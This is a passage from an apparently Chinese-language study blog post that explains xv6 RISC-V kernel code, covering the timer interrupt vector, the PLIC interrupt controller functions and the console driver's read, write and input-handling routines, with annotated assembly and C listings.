gp, 16(sp)</span><br><span class="line">        # not tp (contains hartid), in case we moved CPUs</span><br><span class="line">        # thread pointer 是当前硬件线程的ID hartid</span><br><span class="line">        </span><br><span class="line">        ld t0, 32(sp)</span><br><span class="line">        ld t1, 40(sp)</span><br><span class="line">        ld t2, 48(sp)</span><br><span class="line">        ld s0, 56(sp)</span><br><span class="line">        ld s1, 64(sp)</span><br><span class="line">        ld a0, 72(sp)</span><br><span class="line">        ld a1, 80(sp)</span><br><span class="line">        ld a2, 88(sp)</span><br><span class="line">        ld a3, 96(sp)</span><br><span class="line">        ld a4, 104(sp)</span><br><span class="line">        ld a5, 112(sp)</span><br><span class="line">        ld a6, 120(sp)</span><br><span class="line">        ld a7, 128(sp)</span><br><span class="line">        ld s2, 136(sp)</span><br><span class="line">        ld s3, 144(sp)</span><br><span class="line">        ld s4, 152(sp)</span><br><span class="line">        ld s5, 160(sp)</span><br><span class="line">        ld s6, 168(sp)</span><br><span class="line">        ld s7, 176(sp)</span><br><span class="line">        ld s8, 184(sp)</span><br><span class="line">        ld s9, 192(sp)</span><br><span class="line">        ld s10, 200(sp)</span><br><span class="line">        ld s11, 208(sp)</span><br><span class="line">        ld t3, 216(sp)</span><br><span class="line">        ld t4, 224(sp)</span><br><span class="line">        ld t5, 232(sp)</span><br><span class="line">        ld t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        addi sp, sp, 256</span><br><span class="line"></span><br><span class="line">        # return to whatever we were doing in the kernel.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure><h4 id="timervec"><a href="#timervec" class="headerlink" title="timervec:"></a><code>timervec:</code></h4><p><code>start.c</code>已经设置了<code>mscratch</code>指向的地址：</p><ul><li><code>scratch[0, 8, 16]:</code>存储寄存器的值</li><li><code>scratch[24]:</code>保存了CLINT的<code>MTIMECMP</code>寄存器的地址。<code>MTIMECMP</code>寄存器用于设置RISC-V系统的定时器中断阈值。</li><li><code>scratch[32]:</code>保存中断之间的期望时间间隔</li></ul><p>**<code>MTIMECMP</code>**是一个RISC-V架构中的一个定时寄存器，其全称为<code>Machine Time Compare Register</code>，该寄存器是<code>RISC-V</code>的机器模式定时器的一部分，用于设置下一个定时器中断的时间阈值。</p><p>工作原理：</p><ul><li>RISC-V 的 <code>mtime</code> 寄存器持续增加，它通常代表着机器的实时计数器，按照固定的频率（通常与处理器的时钟频率一致）递增。</li><li>当 <code>mtime</code> 的值等于或超过 <code>MTIMECMP</code> 寄存器中设置的值时，会触发一个定时器中断。</li><li>中断服务程序可以通过设置 <code>MTIMECMP</code> 为 <code>mtime</code> 当前值加上期望的延迟，来安排下一次中断。</li></ul><p>在多核 RISC-V 系统中，每个处理器核心（hart）通常有它自己的 <code>MTIMECMP</code> 寄存器，允许独立地为每个核心安排中断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># machine-mode timer interrupt.</span><br><span class="line">#</span><br><span class="line">.globl timervec</span><br><span class="line">.align 4</span><br><span class="line">timervec:</span><br><span class="line">        # start.c has set up the memory that mscratch points to:</span><br><span class="line">        # scratch[0,8,16] : register save area.</span><br><span class="line">        # scratch[24] : address of CLINT&#x27;s MTIMECMP register.</span><br><span class="line">        # scratch[32] : desired interval between interrupts.</span><br><span class="line">        </span><br><span class="line">        csrrw a0, mscratch, a0 # 读取mscratch寄存器的值到a0，并将a0的旧值写回mscratch</span><br><span class="line">        sd a1, 0(a0)</span><br><span class="line">        sd a2, 8(a0)</span><br><span class="line">        sd a3, 16(a0)</span><br><span class="line"></span><br><span class="line">        # schedule the next timer interrupt</span><br><span class="line">        # by adding interval to mtimecmp.</span><br><span class="line">        ld a1, 24(a0) # CLINT_MTIMECMP(hart)</span><br><span class="line">        ld a2, 32(a0) # interval</span><br><span class="line">        ld a3, 0(a1)  # 加载当前MTIMECMP的值到a3</span><br><span class="line">        add a3, a3, a2 # 将中断间隔时间加载到MTIMECMP上，准备下一个中断</span><br><span class="line">        sd a3, 0(a1) # 新的MTIMECMP存回到相应的内存位置</span><br><span class="line"></span><br><span class="line">        # arrange for a supervisor software interrupt</span><br><span class="line">        # after this handler returns.</span><br><span class="line">        li a1, 2 # 2表示软件中断</span><br><span class="line">        csrw sip, a1 # 将软件中断请求写入sip寄存器中</span><br><span class="line"></span><br><span class="line"># 恢复现场</span><br><span class="line">        ld a3, 16(a0)</span><br><span class="line">        ld a2, 8(a0)</span><br><span class="line">        ld a1, 0(a0)</span><br><span class="line">        csrrw a0, mscratch, a0</span><br><span class="line"></span><br><span class="line">        mret</span><br></pre></td></tr></table></figure><h3 id="plic-c-the-RISC-V-Platform-Level-Interrupt-Controller-PLIC"><a href="#plic-c-the-RISC-V-Platform-Level-Interrupt-Controller-PLIC" class="headerlink" title="plic.c: the RISC-V Platform Level Interrupt Controller (PLIC)"></a><code>plic.c:</code> the RISC-V Platform Level Interrupt Controller (PLIC)</h3><p>这段代码对应的硬件设备说明在<a href="https://pdos.csail.mit.edu/6.828/2023/readings/FU540-C000-v1.0.pdf%E7%9A%8460%E9%A1%B5">https://pdos.csail.mit.edu/6.828/2023/readings/FU540-C000-v1.0.pdf的60页</a></p><p>给出了<code>PLIC Register Map</code></p><h4 id="plicinit"><a href="#plicinit" class="headerlink" title="plicinit():"></a><code>plicinit():</code></h4><ul><li><code>PLIC = 0x0c000000</code>是PLIC控制寄存器在物理内存中的起始地址。通过这个地址进行内存映射输入输出的操作。</li><li>设置UART0中断优先级</li><li>设为VIRTIO0设备的中断优先级</li><li>乘4是因为寄存器的值是32位的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">plicinit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// set desired IRQ priorities non-zero (otherwise disabled).</span></span><br><span class="line">  <span class="comment">// 设置中断请求优先级</span></span><br><span class="line">    *(uint32*)(PLIC + UART0_IRQ*<span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">    *(uint32*)(PLIC + VIRTIO0_IRQ*<span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="plicinithart"><a href="#plicinithart" class="headerlink" title="plicinithart():"></a><code>plicinithart():</code></h4><p>初始化了每个处理器核心（hart）在平台级中断控制器（PLIC）中的设置，具体操作包括启用特定的中断并设置优先级。</p><ul><li><p><code>PLIC_SENABLE(hart)</code>宏通过给定的核心编号（hart）和以上规则，计算出该核心对应到的<code>supervisor mode</code>中断启用寄存器的地址。</p><p>当<code>hart = 0</code>时，我们使用PLIC_SENABLE计算出物理地址<code>0x0c00_2080</code>，通过<code>PLIC Register Map</code>可知：</p><p><img src="/../images/Lab-Copy-on-Write-Fork-for-xv6/%E6%88%AA%E5%B1%8F2024-03-08%2019.48.22.png" alt="截屏2024-03-08 19.48.22"></p><p>也即使能核心0在Machine mode下的全局中断1</p><p>查表发现PLIC_SPRIORITY对应的地址：</p><p><img src="/../images/Lab-Copy-on-Write-Fork-for-xv6/%E6%88%AA%E5%B1%8F2024-03-08%2020.02.53.png" alt="截屏2024-03-08 20.02.53"></p><p>0会屏蔽所有优先级小于或等于阈值的PLIC中断。例如，阈值为零时允许所有非零优先级的中断，而阈值为7时则屏蔽所有中断。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">plicinithart</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">int</span> hart = cpuid();<span class="comment">// 获取当前处理器核心的hart id ( 硬件线程id )</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set enable bits for this hart&#x27;s S-mode</span></span><br><span class="line">  <span class="comment">// for the uart and virtio disk.</span></span><br><span class="line">  *(uint32*)PLIC_SENABLE(hart) = (<span class="number">1</span> &lt;&lt; UART0_IRQ) | (<span class="number">1</span> &lt;&lt; VIRTIO0_IRQ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set this hart&#x27;s S-mode priority threshold to 0.</span></span><br><span class="line">  <span class="comment">// 将当前hart的supervisor mode中断优先级阈值设置为0</span></span><br><span class="line">  <span class="comment">// 阈值为0 意味着所有优先级大于0的中断都会被当前hart接受</span></span><br><span class="line">  *(uint32*)PLIC_SPRIORITY(hart) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="plic-claim"><a href="#plic-claim" class="headerlink" title="plic_claim()"></a><code>plic_claim()</code></h4><p>向 <code>plant level interrupt controller</code> 询问我们应该处理什么中断</p><p><code>PLIC_SCLAIM</code>宏定义到</p><p><img src="/../images/Lab-Copy-on-Write-Fork-for-xv6/%E6%88%AA%E5%B1%8F2024-03-08%2020.09.48.png" alt="截屏2024-03-08 20.09.48"></p><p>现在我们知道该代码实际上是读取当前hart的supervisor mode中断 认领&#x2F;完成<code>(SCLAIM)</code>寄存器</p><p><img src="/../images/Lab-Copy-on-Write-Fork-for-xv6/%E6%88%AA%E5%B1%8F2024-03-08%2020.11.59.png" alt="截屏2024-03-08 20.11.59"></p><blockquote><p>读取到的零表示没有中断待处理。非零的读取结果包含了最高优先级待处理中断的ID。向这个寄存器写入数据表示完成了写入的中断ID所对应的中断处理。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这行代码实际上是读取当前hart的S模式中断认领/完成（SCLAIM）寄存器。PLIC_SCLAIM(hart)根据核心ID</span></span><br><span class="line"><span class="comment"> * 计算出SCLAIM寄存器的地址，然后通过解引用该地址获取存储在其中的值。</span></span><br><span class="line"><span class="comment"> * 读取这个寄存器会返回当前有待处理的最高优先级中断的ID。如果没有待处理的中断，寄存器会返回0。</span></span><br><span class="line"><span class="comment"> * 同时，读取操作会自动清除相应的中断源上的待处理位，这意味着中断被核心成功认领。</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">plic_claim</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">int</span> hart = cpuid();</span><br><span class="line">  <span class="type">int</span> irq = *(uint32*)PLIC_SCLAIM(hart);</span><br><span class="line">  <span class="keyword">return</span> irq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="plic-complete"><a href="#plic-complete" class="headerlink" title="plic_complete()"></a><code>plic_complete()</code></h4><p>向该寄存器写入数据表示完成了写入的中断ID对应的中断处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tell the PLIC we&#x27;ve served this IRQ.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">plic_complete</span><span class="params">(<span class="type">int</span> irq)</span> &#123;</span><br><span class="line">  <span class="type">int</span> hart = cpuid();</span><br><span class="line">  *(uint32*)PLIC_SCLAIM(hart) = irq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="console-c"><a href="#console-c" class="headerlink" title="console.c:"></a><code>console.c:</code></h3><p>控制台输入输出，通过UART。<br>读取操作是一行一行进行的。<br>实现了特殊输入字符：<br>换行符 – 行尾<br>Control-H – 退格<br>Control-U – 删除行<br>Control-D – 文件结束<br>Control-P – 打印进程列表</p><h4 id="void-consputc"><a href="#void-consputc" class="headerlink" title="void consputc()"></a><code>void consputc()</code></h4><p>向UART发送一个字符，被函数<code>printf()</code>调用，用于回显输入字符，但不能由<code>write()</code>调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">consputc</span><span class="params">(<span class="type">int</span> c)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(c == BACKSPACE)&#123;</span><br><span class="line">    <span class="comment">// if the user typed backspace, overwrite with a space.</span></span><br><span class="line">    uartputc_sync(<span class="string">&#x27;\b&#x27;</span>); uartputc_sync(<span class="string">&#x27; &#x27;</span>); uartputc_sync(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    uartputc_sync(c); <span class="comment">// 向uart中发送字符c</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>uartputc_sync</code>和<code>uartputc</code>的区别：</p><blockquote><p>假设你的操作系统正在运行一个用户程序，用户程序想要通过调用<code>write()</code>系统调用来输出一些字符到控制台。同时，假设操作系统也希望能够在处理某些内核事件时（如打印内核日志）输出字符到控制台。</p><h3 id="使用uartputc"><a href="#使用uartputc" class="headerlink" title="使用uartputc"></a>使用<code>uartputc</code></h3><p>当用户程序调用<code>write()</code>系统调用来输出字符时，内核会使用<code>uartputc</code>函数。因为用户程序的执行不是时间敏感的，如果输出缓冲区满了，它可以等待（即阻塞），直到有空间可用再继续输出。这种方式允许操作系统高效地管理UART的输出缓冲区，减少对CPU资源的占用。</p><ul><li><strong>例子</strong>：用户程序通过<code>write()</code>输出”Hello, world!”。如果输出缓冲区已满，<code>write()</code>操作会等待，直到缓冲区有足够的空间来存放这些字符。</li></ul><h3 id="使用uartputc-sync"><a href="#使用uartputc-sync" class="headerlink" title="使用uartputc_sync"></a>使用<code>uartputc_sync</code></h3><p>另一方面，如果内核需要在处理中断时输出字符（例如，打印调试信息），它不能使用会阻塞的<code>uartputc</code>，因为中断处理程序需要快速执行并返回，避免阻塞和延迟。在这种情况下，内核会使用<code>uartputc_sync</code>，它通过轮询等待，直到UART准备好发送新字符，不涉及等待或阻塞。</p><ul><li><strong>例子</strong>：内核需要在处理一个硬件中断时打印一条调试信息。使用<code>uartputc_sync</code>可以确保信息被立即输出到控制台，而不会阻塞中断处理的其余部分。即使输出寄存器不立即可用，它也会通过忙等（busy-waiting）直到可以发送字符，而不是挂起当前进程。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>uartputc</code>适合在正常的程序执行流程中使用，其中阻塞等待输出空间变得可用是可接受的。<code>uartputc_sync</code>适用于那些不能被阻塞的上下文，如内核打印或中断处理程序，需要立即输出字符而不影响系统的响应性。</p></blockquote><h4 id="struct-cons"><a href="#struct-cons" class="headerlink" title="struct cons:"></a><code>struct cons:</code></h4><p>这是一个<code>console</code>输入缓冲区的数据结构，用于管理从用户接收到的输入字符。</p><ul><li><code>spinlock</code>用于保证对缓冲区的访问是互斥的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// input</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INPUT_BUF_SIZE 128</span></span><br><span class="line">  <span class="type">char</span> buf[INPUT_BUF_SIZE];<span class="comment">// 字符缓冲区数组</span></span><br><span class="line">  uint r;  <span class="comment">// Read index  指向缓冲区中下一个要被读取的字符位置</span></span><br><span class="line">  uint w;  <span class="comment">// Write index 指向缓冲区下一个要写入字符的位置</span></span><br><span class="line">  uint e;  <span class="comment">// Edit index  光标位置或编辑位置</span></span><br><span class="line">&#125; cons;</span><br></pre></td></tr></table></figure><h4 id="consolewrite"><a href="#consolewrite" class="headerlink" title="consolewrite()"></a><code>consolewrite()</code></h4><p>用户对<code>console</code>调用的<code>write()</code>来到这里，也即：用于处理用户空间程序向控制台写入数据的请求。</p><ul><li><p><code>either_copying(void *dst, int user_src, uint64 src, uint64 len)</code></p><p>可以实现从用户态或者内核态拷贝数据到目的地址</p><p>其中<code>user_src</code>为真是表示原地址在用户态中</p></li><li><p><code>uartputc(c)</code>将字符c发送至<code>uart</code>中（该函数在uart.c中，稍后我们在讨论这个文件时会做详细解释）</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/</span><br><span class="line"><span class="comment">// user write()s to the console go here.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">consolewrite</span><span class="params">(<span class="type">int</span> user_src, uint64 src, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">if</span>(either_copyin(&amp;c, user_src, src+i, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    uartputc(c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="consoleread"><a href="#consoleread" class="headerlink" title="consoleread()"></a><code>consoleread()</code></h4><p>用于处理用户空间程序从控制台读取数据的请求。</p><p>拷贝整个输入行到目的地址<code>dst</code></p><ul><li><p><code>Sleep(&amp;cons.r, &amp;cons.lock)</code>中传入<code>&amp;cons.r</code>的原因：</p><p><code>sleep</code>函数将<code>&amp;cons.r</code>作为<code>chan</code>参数传入，这表示当前进程希望在控制台输入缓冲区的读索引<code>cons.r</code>上睡眠，当前进程将等待，知道有新的数据写入缓冲区（此时<code>cons.r</code>会发生变化）并在另一个进程（可能是中断处理程序）在相同的通道（即<code>&amp;cons.r</code>）上调用<code>wakeup</code>后被唤醒。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">consoleread</span><span class="params">(<span class="type">int</span> user_dst, uint64 dst, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  uint target;</span><br><span class="line">  <span class="type">int</span> c;</span><br><span class="line">  <span class="type">char</span> cbuf;</span><br><span class="line"></span><br><span class="line">  target = n;</span><br><span class="line">  acquire(&amp;cons.lock); <span class="comment">// 尝试获取控制台缓冲区的锁，以保证对缓冲区的访问的互斥</span></span><br><span class="line">  <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// wait until interrupt handler has put some</span></span><br><span class="line">    <span class="comment">// input into cons.buffer.</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 不断检查是否有数据可读（即检查读索引和写索引是否相等）</span></span><br><span class="line">    <span class="keyword">while</span>(cons.r == cons.w)&#123;</span><br><span class="line">      <span class="keyword">if</span>(killed(myproc()))&#123;</span><br><span class="line">        release(&amp;cons.lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 若缓冲区为空，则当前进程睡眠</span></span><br><span class="line">      sleep(&amp;cons.r, &amp;cons.lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从缓冲区中读取数据</span></span><br><span class="line">    c = cons.buf[cons.r++ % INPUT_BUF_SIZE]; <span class="comment">// input is buffered in buf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C(&#x27;D&#x27;) control-D 表示文件结束</span></span><br><span class="line">    <span class="keyword">if</span>(c == C(<span class="string">&#x27;D&#x27;</span>))&#123;  <span class="comment">// end-of-file</span></span><br><span class="line">      <span class="keyword">if</span>(n &lt; target)&#123;</span><br><span class="line">        <span class="comment">// Save ^D for next time, to make sure</span></span><br><span class="line">        <span class="comment">// caller gets a 0-byte result.</span></span><br><span class="line">        cons.r--;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy the input byte to the user-space buffer.</span></span><br><span class="line">    <span class="comment">// 将输入的字节拷贝到用户空间缓冲区</span></span><br><span class="line">    cbuf = c;</span><br><span class="line">    <span class="keyword">if</span>(either_copyout(user_dst, dst, &amp;cbuf, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    dst++; <span class="comment">// 移动dst一个字节</span></span><br><span class="line">    --n;   <span class="comment">// 已经拷贝了一个字节的数据，n -1 表示剩余要拷贝的数据的字节数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 已经读取了一行，返回到用户空间的read函数</span></span><br><span class="line">    <span class="keyword">if</span>(c == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">      <span class="comment">// a whole line has arrived, return to</span></span><br><span class="line">      <span class="comment">// the user-level read().</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;cons.lock); <span class="comment">// 解锁</span></span><br><span class="line">  <span class="keyword">return</span> target - n; <span class="comment">// 返回实际读取到的数据的字节数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="consoleintr"><a href="#consoleintr" class="headerlink" title="consoleintr()"></a><code>consoleintr()</code></h4><ul><li>控制台输入处理程序</li><li>当输入字符时，<code>uartintr()</code>调用该函数</li><li>执行擦出&#x2F;删除处理，追加到cons.buf</li><li>如果一整行数据到来时，唤醒<code>consoleread()</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">consoleintr</span><span class="params">(<span class="type">int</span> c)</span> &#123;</span><br><span class="line">  acquire(&amp;cons.lock); <span class="comment">// 上锁</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="title function_">C</span><span class="params">(<span class="string">&#x27;P&#x27;</span>)</span>:  <span class="comment">// Print process list. 打印进程的信息</span></span><br><span class="line">    <span class="title function_">procdump</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="title function_">C</span><span class="params">(<span class="string">&#x27;U&#x27;</span>)</span>:  <span class="comment">// Kill line. 删除这一行</span></span><br><span class="line">    <span class="title function_">while</span><span class="params">(cons.e != cons.w &amp;&amp;</span></span><br><span class="line"><span class="params">          cons.buf[(cons.e<span class="number">-1</span>) % INPUT_BUF_SIZE] != <span class="string">&#x27;\n&#x27;</span>)</span>&#123;</span><br><span class="line">      cons.e--;</span><br><span class="line">      consputc(BACKSPACE); <span class="comment">//对每次删除发送一个退格字符以反映回显</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="title function_">C</span><span class="params">(<span class="string">&#x27;H&#x27;</span>)</span>: <span class="comment">// Backspace 回退操作</span></span><br><span class="line">  <span class="keyword">case</span> &#x27;\x7f&#x27;: <span class="comment">// Delete key 删除键</span></span><br><span class="line">    <span class="title function_">if</span><span class="params">(cons.e != cons.w)</span>&#123;</span><br><span class="line">      cons.e--; <span class="comment">// 删除缓冲区的最后一个字符</span></span><br><span class="line">      consputc(BACKSPACE); <span class="comment">// 发送退格字符进行回显</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// 输入字符不为空，且控制台缓冲区读取的索引 - 编辑的索引 小于缓冲区大小</span></span><br><span class="line">    <span class="keyword">if</span>(c != <span class="number">0</span> &amp;&amp; cons.e-cons.r &lt; INPUT_BUF_SIZE)&#123;</span><br><span class="line">      c = (c == <span class="string">&#x27;\r&#x27;</span>) ? <span class="string">&#x27;\n&#x27;</span> : c;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// echo back to the user.</span></span><br><span class="line">      consputc(c);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// store for consumption by consoleread().</span></span><br><span class="line">      <span class="comment">// 将该字符追加到控制台缓冲区中</span></span><br><span class="line">      cons.buf[cons.e++ % INPUT_BUF_SIZE] = c;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(c == <span class="string">&#x27;\n&#x27;</span> || c == C(<span class="string">&#x27;D&#x27;</span>) || cons.e-cons.r == INPUT_BUF_SIZE)&#123;</span><br><span class="line">        <span class="comment">// wake up consoleread() if a whole line (or end-of-file)</span></span><br><span class="line">        <span class="comment">// has arrived.</span></span><br><span class="line">        <span class="comment">// 整行到达，唤醒consoleread</span></span><br><span class="line">        cons.w = cons.e;</span><br><span class="line">        wakeup(&amp;cons.r);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  release(&amp;cons.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="consoleinit"><a href="#consoleinit" class="headerlink" title="consoleinit()"></a><code>consoleinit()</code></h4><ul><li><p><code>devsw[CONSOLE]</code></p><ul><li><p>首先我们查看<code>devsw</code>和<code>CONSOLE</code>的定义：</p><ul><li>devsw用于映射主设备号到设备函数</li><li>定义了CONSOLE为第一个设备</li><li>允许操作系统根据设备号调用相应设备的读取和写入操作函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 